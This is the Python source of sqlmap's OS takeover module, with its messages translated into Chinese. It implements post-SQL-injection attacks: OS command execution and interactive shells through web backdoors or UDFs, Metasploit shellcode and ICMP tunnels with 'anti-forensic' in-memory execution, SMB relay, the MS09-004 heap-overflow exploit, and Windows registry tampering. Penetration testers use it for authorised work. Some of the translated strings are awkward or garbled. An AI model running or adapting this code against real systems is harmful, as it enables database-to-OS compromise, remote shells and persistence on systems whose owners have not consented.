#!/usr/bin/env python

"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import Backend
from lib.core.common import getSafeExString
from lib.core.common import isDigit
from lib.core.common import isStackingAvailable
from lib.core.common import openFile
from lib.core.common import readInput
from lib.core.common import runningAsAdmin
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingDependence
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapMissingPrivileges
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.exception import SqlmapSystemException
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.exception import SqlmapUnsupportedDBMSException
from lib.takeover.abstraction import Abstraction
from lib.takeover.icmpsh import ICMPsh
from lib.takeover.metasploit import Metasploit
from lib.takeover.registry import Registry

class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
    """
    This class defines generic OS takeover functionalities for plugins.
    """

    def __init__(self):
        self.cmdTblName = ("%soutput" % conf.tablePrefix)
        self.tblField = "data"

        Abstraction.__init__(self)

    def osCmd(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "将使用web后门执行命令"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "无法通过执行操作系统命令 "
            errMsg += "后端DBMS"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()
        self.initEnv(web=web)

        if not web or (web and self.webBackdoorUrl is not None):
            self.runCmd(conf.osCmd)

        if not conf.osShell and not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osShell(self):
        if isStackingAvailable() or conf.direct:
            web = False
        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
            infoMsg = "将使用web后门进行命令提示"
            logger.info(infoMsg)

            web = True
        else:
            errMsg = "无法通过后端DBMS "
            errMsg += " 提示交互式操作系统shell"
            errMsg += "因为不支持堆栈查询SQL注入"
            raise SqlmapNotVulnerableException(errMsg)

        self.getRemoteTempPath()

        try:
            self.initEnv(web=web)
        except SqlmapFilePathException:
            if not web and not conf.direct:
                infoMsg = "回退到web后门方法..."
                logger.info(infoMsg)

                web = True
                kb.udfFail = True

                self.initEnv(web=web)
            else:
                raise

        if not web or (web and self.webBackdoorUrl is not None):
            self.shell()

        if not conf.osPwn and not conf.cleanup:
            self.cleanup(web=web)

    def osPwn(self):
        goUdf = False
        fallbackToWeb = False
        setupSuccess = False

        self.checkDbmsOs()

        if Backend.isOs(OS.WINDOWS):
            msg = "你想怎样建立隧道?"
            msg += "\n[1] TCP: Metasploit Framework (默认)"
            msg += "\n[2] ICMP: icmpsh - ICMP tunneling"

            while True:
                tunnel = readInput(msg, default='1')

                if isDigit(tunnel) and int(tunnel) in (1, 2):
                    tunnel = int(tunnel)
                    break

                else:
                    warnMsg = "无效值，有效值为'1'和'2'"
                    logger.warning(warnMsg)
        else:
            tunnel = 1

            debugMsg = "只有在以下情况下才能通过TCP建立隧道 "
            debugMsg += "后端DBMS不是Windows"
            logger.debug(debugMsg)

        if tunnel == 2:
            isAdmin = runningAsAdmin()

            if not isAdmin:
                errMsg = "您需要以管理员身份运行sqlmap "
                errMsg += "如果您想建立带外ICMP隧道"
                errMsg += "因为icmpsh使用原始"
                errMsg += "套接字来嗅探和处理ICMP数据包"
                raise SqlmapMissingPrivileges(errMsg)

            try:
                __import__("impacket")
            except ImportError:
                errMsg = "sqlmap需要'python impacket'第三方库 "
                errMsg += "才能运行icmpsh master，你可以在 "
                errMsg += "https://github.com/SecureAuthCorp/impacket"
                raise SqlmapMissingDependence(errMsg)

            filename = "/proc/sys/net/ipv4/icmp_echo_ignore_all"

            if os.path.exists(filename):
                try:
                    with openFile(filename, "wb") as f:
                        f.write("1")
                except IOError as ex:
                    errMsg = "文件名存在文件打开 "
                    errMsg += "/写入错误 '%s' ('%s')" % (filename, getSafeExString(ex))
                    raise SqlmapSystemException(errMsg)
            else:
                errMsg = "您需要在计算机系统范围内禁用ICMP应答 "
                errMsg += "例如，在Linux/Unix上运行:\n"
                errMsg += "# sysctl -w net.ipv4.icmp_echo_ignore_all=1\n"
                errMsg += "如果你错过了这一点"
                errMsg += "你将从数据库中收到信息 "
                errMsg += "你不太可能收到服务器发送的命令"
                logger.error(errMsg)

            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                self.sysUdfs.pop("sys_bineval")

        self.getRemoteTempPath()

        if isStackingAvailable() or conf.direct:
            web = False

            self.initEnv(web=web)

            if tunnel == 1:
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    msg = "您希望如何执行Metasploit外壳代码 "
                    msg += "在后端数据库底层操作系统上?"
                    msg += "\n[1] 通过UDF 'sys_bineval'（内存方式，反取证，默认）"
                    msg += "\n[2] 通过'shellcodeexec'（文件系统方式，首选64位系统）"

                    while True:
                        choice = readInput(msg, default='1')

                        if isDigit(choice) and int(choice) in (1, 2):
                            choice = int(choice)
                            break

                        else:
                            warnMsg = "无效值，有效值为'1'和'2'"
                            logger.warning(warnMsg)

                    if choice == 1:
                        goUdf = True

                if goUdf:
                    exitfunc = "thread"
                    setupSuccess = True
                else:
                    exitfunc = "process"

                self.createMsfShellcode(exitfunc=exitfunc, format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")

                if not goUdf:
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        if Backend.isDbms(DBMS.MYSQL):
                            fallbackToWeb = True
                        else:
                            msg = "无法装载操作系统接管"
                            raise SqlmapFilePathException(msg)

                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:
                    debugMsg = "默认情况下，Windows上的MySQL作为SYSTEM运行 "
                    debugMsg += "用户，无需升级权限"
                    logger.debug(debugMsg)

            elif tunnel == 2:
                setupSuccess = self.uploadIcmpshSlave(web=web)

                if setupSuccess is not True:
                    if Backend.isDbms(DBMS.MYSQL):
                        fallbackToWeb = True
                    else:
                        msg = "无法装载操作系统接管"
                        raise SqlmapFilePathException(msg)

        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):
            web = True

            if fallbackToWeb:
                infoMsg = "回到网络后门建立隧道"
            else:
                infoMsg = "使用网络后门建立隧道"
            logger.info(infoMsg)

            self.initEnv(web=web, forceInit=fallbackToWeb)

            if self.webBackdoorUrl:
                if not Backend.isOs(OS.WINDOWS) and conf.privEsc:
                    # Unset --priv-esc if the back-end DBMS underlying operating
                    # system is not Windows
                    conf.privEsc = False

                    warnMsg = "当后端DBMS底层系统不是Windows时"
                    warnMsg += "sqlmap不实现任何操作系统用户"
                    warnMsg += "权限提升技术"
                    logger.warning(warnMsg)

                if tunnel == 1:
                    self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
                    setupSuccess = self.uploadShellcodeexec(web=web)

                    if setupSuccess is not True:
                        msg = "无法装载操作系统接管"
                        raise SqlmapFilePathException(msg)

                elif tunnel == 2:
                    setupSuccess = self.uploadIcmpshSlave(web=web)

                    if setupSuccess is not True:
                        msg = "无法装载操作系统接管"
                        raise SqlmapFilePathException(msg)

        if setupSuccess:
            if tunnel == 1:
                self.pwn(goUdf)
            elif tunnel == 2:
                self.icmpPwn()
        else:
            errMsg = "无法提示带外会话"
            raise SqlmapNotVulnerableException(errMsg)

        if not conf.cleanup:
            self.cleanup(web=web)

    def osSmb(self):
        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "后端DBMS底层操作系统 "
            errMsg += "不是Windows： "
            errMsg += "无法执行SMB中继攻击"
            raise SqlmapUnsupportedDBMSException(errMsg)

        if not isStackingAvailable() and not conf.direct:
            if Backend.getIdentifiedDbms() in (DBMS.PGSQL, DBMS.MSSQL):
                errMsg = "在该后端DBMS上 "
                errMsg += "只有在支持堆叠查询的情况下 "
                errMsg += "才能执行SMB中继攻击"
                raise SqlmapUnsupportedDBMSException(errMsg)

            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "因为不支持堆叠查询, "
                debugMsg += " sqlmap将通过推理盲SQL注入"
                debugMsg += "执行SMB中继攻击"
                logger.debug(debugMsg)

        printWarn = True
        warnMsg = "这次袭击不太可能成功 "

        if Backend.isDbms(DBMS.MYSQL):
            warnMsg += "因为默认情况下，Windows上的MySQL运行方式为 "
            warnMsg += "非真实用户的本地系统,  "
            warnMsg += "连接到SMB服务时 "
            warnMsg += "它不会发送NTLM会话哈希"

        elif Backend.isDbms(DBMS.PGSQL):
            warnMsg += "因为默认情况下，PostgreSQL在Windows上运行 "
            warnMsg += "作为postgres用户，该用户是 "
            warnMsg += "system，但不在Administrators组内"

        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
            warnMsg += "因为通常Microsoft SQL Server %s " % Backend.getVersion()
            warnMsg += "作为非真实用户的网络服务运行, "
            warnMsg += " 连接到SMB服务时"
            warnMsg += "它不会发送NTLM会话哈希"

        else:
            printWarn = False

        if printWarn:
            logger.warning(warnMsg)

        self.smb()

    def osBof(self):
        if not isStackingAvailable() and not conf.direct:
            return

        if not Backend.isDbms(DBMS.MSSQL) or not Backend.isVersionWithin(("2000", "2005")):
            errMsg = "后端DBMS必须是Microsoft SQL Server "
            errMsg += "2000 或 2005 能够利用基于堆的 "
            errMsg += "'sp_replwritetovarbin' 中基于堆的缓冲区溢出 "
            errMsg += "存储过程 (MS09-004)"
            raise SqlmapUnsupportedDBMSException(errMsg)

        infoMsg = "将利用Microsoft SQL Server %s " % Backend.getVersion()
        infoMsg += "'sp_replwritetovarbin'存储过程基于堆 "
        infoMsg += "缓冲区溢出 (MS09-004)"
        logger.info(infoMsg)

        msg = "该技术可能会DoS DBMS进程 "
        msg += "您确定要利用该漏洞吗? [y/N] "

        if readInput(msg, default='N', boolean=True):
            self.initEnv(mandatory=False, detailed=True)
            self.getRemoteTempPath()
            self.createMsfShellcode(exitfunc="seh", format="raw", extra="-b 27", encode=True)
            self.bof()

    def uncPathRequest(self):
        errMsg = "必须定义'uncPathRequest'方法 "
        errMsg += "到特定的DBMS插件"
        raise SqlmapUndefinedMethod(errMsg)

    def _regInit(self):
        if not isStackingAvailable() and not conf.direct:
            return

        self.checkDbmsOs()

        if not Backend.isOs(OS.WINDOWS):
            errMsg = "后端DBMS底层操作系统 "
            errMsg += "不是windows"
            raise SqlmapUnsupportedDBMSException(errMsg)

        self.initEnv()
        self.getRemoteTempPath()

    def regRead(self):
        self._regInit()

        if not conf.regKey:
            default = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
            msg = "要读取哪个注册表项? [%s] " % default
            regKey = readInput(msg, default=default)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            default = "ProductName"
            msg = "要读取哪个注册表项值? [%s] " % default
            regVal = readInput(msg, default=default)
        else:
            regVal = conf.regVal

        infoMsg = "正在读取Windows注册表路径 '%s\\%s' " % (regKey, regVal)
        logger.info(infoMsg)

        return self.readRegKey(regKey, regVal, True)

    def regAdd(self):
        self._regInit()

        errMsg = "缺少强制选项"

        if not conf.regKey:
            msg = "要写入哪个注册表项？ "
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "要写入哪个注册表项值？"
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        if not conf.regData:
            msg = "要写入哪个注册表项值数据? "
            regData = readInput(msg)

            if not regData:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regData = conf.regData

        if not conf.regType:
            default = "REG_SZ"
            msg = "它是哪个注册表项值数据类型? "
            msg += "[%s] " % default
            regType = readInput(msg, default=default)
        else:
            regType = conf.regType

        infoMsg = "添加Windows注册表路径 '%s\\%s' " % (regKey, regVal)
        infoMsg += "带有数据 '%s'. " % regData
        infoMsg += "仅当用户运行数据库时，此操作才有效 "
        infoMsg += "进程具有修改Windows注册表的权限."
        logger.info(infoMsg)

        self.addRegKey(regKey, regVal, regType, regData)

    def regDel(self):
        self._regInit()

        errMsg = "缺少强制选项"

        if not conf.regKey:
            msg = "要删除哪个注册表项? "
            regKey = readInput(msg)

            if not regKey:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regKey = conf.regKey

        if not conf.regVal:
            msg = "要删除哪个注册表项值? "
            regVal = readInput(msg)

            if not regVal:
                raise SqlmapMissingMandatoryOptionException(errMsg)
        else:
            regVal = conf.regVal

        message = "是否确实要删除Windows"
        message += "注册表路径 '%s\\%s? [y/N] " % (regKey, regVal)

        if not readInput(message, default='N', boolean=True):
            return

        infoMsg = "删除Windows注册表路径 '%s\\%s'. " % (regKey, regVal)
        infoMsg += "仅当用户运行数据库时，此操作才有效 "
        infoMsg += "进程具有修改Windows注册表的权限."
        logger.info(infoMsg)

        self.delRegKey(regKey, regVal)
